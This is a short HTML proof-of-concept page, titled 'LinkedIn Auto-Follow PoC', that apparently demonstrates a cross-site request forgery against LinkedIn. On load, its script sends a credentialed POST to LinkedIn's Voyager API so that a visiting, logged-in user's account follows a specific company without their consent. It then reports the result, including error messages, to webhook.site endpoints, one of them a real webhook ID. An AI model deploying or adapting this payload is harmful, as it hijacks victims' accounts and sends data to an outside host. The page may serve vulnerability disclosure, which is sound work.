<!DOCTYPE html>
<html>
<head>
  <title>LinkedIn Auto-Follow PoC</title>
</head>
<body>
  <script>
    fetch("https://www.linkedin.com/voyager/api/feed/dash/followingStates/urn:li:fsd_followingState:urn:li:fsd_company:9372578", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        patch: {
          $set: {
            following: true
          }
        }
      })
    })
    .then(response => {
      console.log("LinkedIn follow status:", response.status);
      return fetch("https://webhook.site/your-unique-id?status=" + response.status);
    })
    .catch(error => {
      console.error("Request failed:", error);
      fetch("https://webhook.site/46ee6e83-3b97-4bd3-873d-861e50f9eee7" + encodeURIComponent(error.message));
    });
  </script>
</body>
</html>
